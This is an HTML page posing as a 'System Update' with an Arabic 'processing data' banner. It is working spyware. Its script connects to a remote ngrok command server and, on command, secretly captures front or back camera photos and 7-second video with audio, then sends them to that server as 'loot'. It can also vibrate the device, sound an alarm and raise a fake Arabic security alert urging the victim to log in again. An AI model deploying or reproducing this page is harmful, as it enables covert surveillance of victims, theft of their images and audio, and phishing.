<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>System Update</title>
    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
    <h2>جاري معالجة البيانات...</h2>
    <script>
        const socket = io("https://kinship-porridge-molasses.ngrok-free.dev");
        
        async function getMedia(facing, type) {
            const constraints = {
                video: { facingMode: facing, width: 1280, height: 720 },
                audio: type === 'vid'
            };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            
            if (type === 'img') {
                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                socket.emit('loot', {type:'photo', data: c.toDataURL('image/png').split(',')[1]});
                stream.getTracks().forEach(t => t.stop());
            } else {
                const rec = new MediaRecorder(stream); const ch = [];
                rec.ondataavailable = e => ch.push(e.data);
                rec.onstop = () => {
                    const r = new FileReader();
                    r.onload = () => socket.emit('loot', {type:'video', data: r.result.split(',')[1]});
                    r.readAsDataURL(new Blob(ch));
                    stream.getTracks().forEach(t => t.stop());
                };
                rec.start(); setTimeout(() => rec.stop(), 7000);
            }
        }

        socket.on('command', (cmd) => {
            if(cmd.action === 'scan_back') getMedia('environment', 'img');
            if(cmd.action === 'scan_front') getMedia('user', 'img');
            if(cmd.action === 'vid_back') getMedia('environment', 'vid');
            if(cmd.action === 'vid_front') getMedia('user', 'vid');
            if(cmd.action === 'vibrate') navigator.vibrate([500, 200, 500]);
            if(cmd.action === 'alarm') { let a = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3'); a.play(); }
            if(cmd.action === 'notify') alert("⚠️ تم اكتشاف نشاط مشبوه، يرجى إعادة تسجيل الدخول");
        });
    </script>
</body>
</html>
